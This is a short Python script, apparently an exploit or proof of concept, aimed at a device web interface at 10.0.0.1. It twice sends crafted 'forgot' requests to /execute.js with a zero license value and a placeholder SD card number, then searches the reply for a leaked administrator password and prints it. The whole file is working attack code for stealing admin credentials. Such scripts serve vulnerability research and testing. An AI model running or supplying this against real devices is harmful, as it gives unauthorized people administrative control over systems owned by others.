import requests
import re
import time

TARGET = 'http://10.0.0.1'
EXECUTE_URL = TARGET + '/execute.js'

session = requests.Session()

resp = session.post(EXECUTE_URL, params={'exec': 'forgot'}, 
                    data={'license': '0', 'sdcard': '1234567890'}, timeout=10)
time.sleep(2)

resp2 = session.post(EXECUTE_URL, params={'exec': 'forgot'}, 
                    data={'license': '0', 'sdcard': '1234567890'}, timeout=10)
text = resp2.text

print(f"Response length: {len(text)} bytes")

# Check for password leak
if "Your admin password is" in text:
    match = re.search(r"Your admin password is:\s*(.+)", text)
    if match:
        print(f"[+] ADMIN PASSWORD: {match.group(1).strip()}")

# Check for keywords
for kw in ["admin", "password", "Your admin", "invalid", "radius+license"]:
    if kw.lower() in text.lower():
        count = text.lower().count(kw.lower())
        print(f"Keyword '{kw}': {count} occurrences")

# Save the full response for analysis
with open("forgot_result.html", "w", encoding="utf-8") as f:
    f.write(text)
print("Full response saved to forgot_result.html")
print(f"First 500 chars: {text[:500]}")
